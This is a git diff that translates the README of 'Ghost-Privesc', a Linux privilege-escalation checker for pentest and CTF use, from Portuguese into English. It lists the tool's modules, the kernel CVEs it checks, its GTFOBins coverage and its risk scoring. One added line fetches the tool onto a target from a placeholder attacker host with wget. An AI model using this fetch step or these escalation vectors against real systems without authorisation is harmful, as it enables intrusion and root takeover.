@@ -1,163 +1,153 @@
 # Ghost-Privesc
 
-> By Gh0st-Bx1 | [github.com/Ghost-Bx1](https://github.com/Ghost-Bx1)
+> Linux privilege escalation checker - 17 attack vectors with automatic GTFOBins lookup and risk scoring.
 
-Ferramenta de verificacao de escalada de privilegios no Linux para pentest e CTF. Verifica automaticamente 17 vetores de privesc e gera um score de risco.
+```
+  GHOST-PRIVESC  v1.0.0  |  Linux Privilege Escalation Checker
+  By Gh0st-Bx1           |  github.com/Ghost-Bx1
+```
 
----
-
-## Funcionalidades
-
-| Modulo | Descricao |
-|---|---|
-| `--sistema` | Informacoes do host (kernel, OS, usuario, grupos perigosos) |
-| `--kernel` | CVEs conhecidos (DirtyCow, DirtyPipe, eBPF, Netfilter...) |
-| `--sudo` | Analise de `sudo -l` com lookup GTFOBins automatico |
-| `--suid` | Binarios SUID/SGID com lookup GTFOBins automatico |
-| `--caps` | Linux capabilities perigosas (cap_setuid, cap_sys_admin...) |
-| `--cron` | Cron jobs com scripts inexistentes ou gravieis |
-| `--servicos` | Unit files e binarios de servicos gravieis |
-| `--path` | PATH hijacking (diretorios relativos ou gravieis) |
-| `--nfs` | NFS exports com `no_root_squash` |
-| `--senhas` | Credenciais em /etc/shadow, historico, .env, configs |
-| `--containers` | Docker socket, container privilegiado, LXD escape |
-| `--graveis` | /etc/passwd, /etc/sudoers, crontab e outros criticos |
-| `--env` | Variaveis de ambiente sensiveis (LD_PRELOAD, tokens...) |
-| `--processos` | Processos rodando como root |
-| `--portas` | Servicos em localhost (MySQL, Redis, MongoDB...) |
-| `--usuarios` | UIDs suspeitos (UID=0, home acessiveis) |
+![Python](https://img.shields.io/badge/Python-3.6%2B-blue?style=flat-square)
+![Platform](https://img.shields.io/badge/Platform-Linux-yellow?style=flat-square)
+![Category](https://img.shields.io/badge/Category-Privilege%20Escalation-red?style=flat-square)
 
 ---
 
-## Nivel de risco
+## Overview
 
-Cada achado recebe pontuacao:
-- **CRITICO** — 10 pts
-- **ALTO** — 5 pts
-- **MEDIO** — 3 pts
-- **BAIXO** — 1 pt
+Ghost-Privesc runs on the target Linux host and checks 17 privilege escalation vectors. Each finding is scored by severity to produce a total risk score for the host.
 
-Score total define o risco geral do host.
+| Module        | Description                                                       |
+|---------------|-------------------------------------------------------------------|
+| `--sistema`   | Host info: kernel, OS, user, dangerous groups                     |
+| `--kernel`    | Known kernel CVEs: DirtyCow, DirtyPipe, eBPF, Netfilter          |
+| `--sudo`      | sudo -l analysis with automatic GTFOBins lookup                   |
+| `--suid`      | SUID/SGID binaries with automatic GTFOBins lookup                 |
+| `--caps`      | Dangerous Linux capabilities (cap_setuid, cap_sys_admin)          |
+| `--cron`      | Cron jobs with missing or writable scripts                        |
+| `--servicos`  | Writable service unit files and service binaries                  |
+| `--path`      | PATH hijacking (relative or writable directories)                 |
+| `--nfs`       | NFS exports with no_root_squash                                   |
+| `--senhas`    | Credentials in /etc/shadow, history, .env, config files           |
+| `--containers`| Docker socket, privileged container, LXD escape                  |
+| `--graveis`   | Writable /etc/passwd, /etc/sudoers, crontab                      |
+| `--env`       | Sensitive environment variables (LD_PRELOAD, tokens)              |
+| `--processos` | Processes running as root                                         |
+| `--portas`    | Internal services on localhost (MySQL, Redis, MongoDB)            |
+| `--usuarios`  | Suspicious UIDs and accessible home directories                   |
 
 ---
 
-## Requisitos
+## Risk Scoring
 
-```bash
-# Sem dependencias externas — apenas stdlib Python 3
-python3 --version  # 3.6+
+| Severity  | Points |
+|-----------|--------|
+| CRITICAL  | 10     |
+| HIGH      | 5      |
+| MEDIUM    | 3      |
+| LOW       | 1      |
 
-# O script deve rodar no alvo Linux (nao funciona no Windows)
+The total score determines the overall risk level for the host.
+
+---
+
+## Requirements
+
+```
+Python 3.6+
+No external dependencies (stdlib only)
+Must run on the target Linux system - does not work on Windows
 ```
 
 ---
 
-## Uso
+## Installation
 
 ```bash
-# Verificacao completa (todos os modulos)
+# Transfer to target (any method)
+wget http://YOUR_IP/ghost-privesc.py -O ghost-privesc.py
+python3 ghost-privesc.py --completo
+```
+
+---
+
+## Usage
+
+```bash
+# Full check (all modules)
 python3 ghost-privesc.py --completo
 
-# Modulos especificos
+# Specific modules
 python3 ghost-privesc.py --sudo --suid --caps
 
-# Apenas senhas e credenciais
+# Credentials and passwords only
 python3 ghost-privesc.py --senhas
 
-# Verificacao rapida de escalada direta
+# Quick direct escalation check
 python3 ghost-privesc.py --sudo --suid --caps --graveis
 
-# Verificacao de containers (Docker/LXD)
+# Container escape checks
 python3 ghost-privesc.py --containers
 
-# Executar sem argumento = completo automatico
+# No arguments runs full check automatically
 python3 ghost-privesc.py
 
-# Salvar relatorio JSON
-python3 ghost-privesc.py --completo --output relatorio.json
+# Save JSON report
+python3 ghost-privesc.py --completo --output report.json
 ```
 
 ---
 
-## Saida exemplo
+## CVEs Checked
 
-```
-  Ghost-Privesc v1.0.0  |  Linux Privilege Escalation Checker
-
-  [=] INFORMACOES DO SISTEMA
-  [INFO   ] Hostname  : ubuntu-victim
-  [INFO   ] Kernel    : 5.8.0-53-generic
-  [INFO   ] OS        : Ubuntu 20.04.3 LTS
-  [CRITICO] Usuario no grupo 'docker' - escape de container possivel
-
-  [=] KERNEL / CVEs CONHECIDOS
-  [CRITICO] Kernel 5.8.0-53-generic pode ser vulneravel: DirtyPipe (CVE-2022-0847)
-
-  [=] SUDO
-  [CRITICO] NOPASSWD: (ALL) NOPASSWD: /usr/bin/find
-  [CRITICO] GTFOBins: find com NOPASSWD => privesc direto
-             Ref: https://gtfobins.github.io/gtfobins/find/#sudo
-
-  [=] SUID / SGID
-  [CRITICO] SUID GTFOBins: /usr/bin/python3.8
-             Ref: https://gtfobins.github.io/gtfobins/python3/#suid
-
-  [=] RESUMO
-  CRITICOS: 3  ALTOS: 2  MEDIOS: 1
-  Score de risco: 38 pontos
-
-  [!] RISCO CRITICO — Multiplos vetores de privesc identificados
-```
+| CVE            | Kernel       | Severity        |
+|----------------|--------------|-----------------|
+| CVE-2016-5195  | 3.x, 4.4     | CRITICAL (DirtyCow)   |
+| CVE-2017-16995 | 4.8          | CRITICAL (eBPF)       |
+| CVE-2022-0847  | 5.7 - 5.12   | CRITICAL (DirtyPipe)  |
+| CVE-2022-25636 | 5.10         | HIGH (Netfilter)      |
+| CVE-2022-32250 | 5.15         | HIGH (nftables UAF)   |
+| CVE-2022-34918 | 5.16         | HIGH (nftables)       |
 
 ---
 
-## Opcoes completas
+## GTFOBins Coverage
 
-```
-opcoes:
-  --completo            Executar todos os modulos
-  --sistema             Informacoes do sistema e grupos
-  --kernel              CVEs de kernel conhecidos
-  --sudo                Analise de sudo -l + GTFOBins
-  --suid                Binarios SUID/SGID + GTFOBins
-  --caps                Linux capabilities
-  --cron                Cron jobs suspeitos
-  --servicos            Unit files e binarios de servicos
-  --path                PATH hijacking
-  --nfs                 NFS no_root_squash
-  --senhas              Credenciais em arquivos
-  --containers          Docker/LXD escape
-  --graveis             Arquivos criticos gravieis
-  --env                 Variaveis de ambiente
-  --processos           Processos como root
-  --portas              Portas internas/localhost
-  --usuarios            UIDs e homes suspeitos
-  --output FILE         Salvar relatorio em JSON
-```
+**SUID/SGID:** bash, sh, find, vim, awk, perl, python, python3, ruby, env, nmap, curl, wget, tar, openssl, base64
+
+**Sudo NOPASSWD:** all above plus docker, systemctl, journalctl, apt, pip, npm, node, php, mysql, psql, git, socat, nc
 
 ---
 
-## CVEs verificados
+## Reference
 
-| CVE | Kernel | Severidade |
-|---|---|---|
-| CVE-2016-5195 | 3.x, 4.4 | CRITICO (DirtyCow) |
-| CVE-2017-16995 | 4.8 | CRITICO (eBPF) |
-| CVE-2022-0847 | 5.7–5.12 | CRITICO (DirtyPipe) |
-| CVE-2022-25636 | 5.10 | ALTO (Netfilter) |
-| CVE-2022-32250 | 5.15 | ALTO (nftables UAF) |
-| CVE-2022-34918 | 5.16 | ALTO (nftables) |
+| Flag          | Description                                 |
+|---------------|---------------------------------------------|
+| `--completo`  | Run all modules                             |
+| `--sistema`   | System info and group membership            |
+| `--kernel`    | Known kernel CVEs                           |
+| `--sudo`      | sudo -l analysis with GTFOBins              |
+| `--suid`      | SUID/SGID binaries with GTFOBins            |
+| `--caps`      | Linux capabilities                          |
+| `--cron`      | Suspicious cron jobs                        |
+| `--servicos`  | Writable service files                      |
+| `--path`      | PATH hijacking vectors                      |
+| `--nfs`       | NFS no_root_squash                          |
+| `--senhas`    | Credential files                            |
+| `--containers`| Docker/LXD escape paths                    |
+| `--graveis`   | Writable critical files                     |
+| `--env`       | Sensitive environment variables             |
+| `--processos` | Processes running as root                   |
+| `--portas`    | Internal listening services                 |
+| `--usuarios`  | Suspicious UIDs and home directories        |
+| `--output`    | Save report to JSON                         |
 
 ---
 
-## GTFOBins cobertos
+## Disclaimer
 
-**SUID/SGID:** bash, sh, find, vim, awk, perl, python, python3, ruby, env, nmap, curl, wget, tar, openssl, base64...
-
-**Sudo NOPASSWD:** todos acima + docker, systemctl, journalctl, apt, pip, npm, node, php, mysql, psql, git, socat, nc...
+For use in authorized environments only. Penetration testing, CTF competitions, and offensive security research with explicit permission from the environment owner. The author is not responsible for misuse.
 
 ---
 
-## Aviso Legal
-
-Uso exclusivo para pesquisa de seguranca, pentest autorizado e CTF. Execute somente em sistemas onde voce tem autorizacao explicita. Os autores nao se responsabilizam pelo uso indevido.
+**By [Gh0st-Bx1](https://github.com/Ghost-Bx1)**
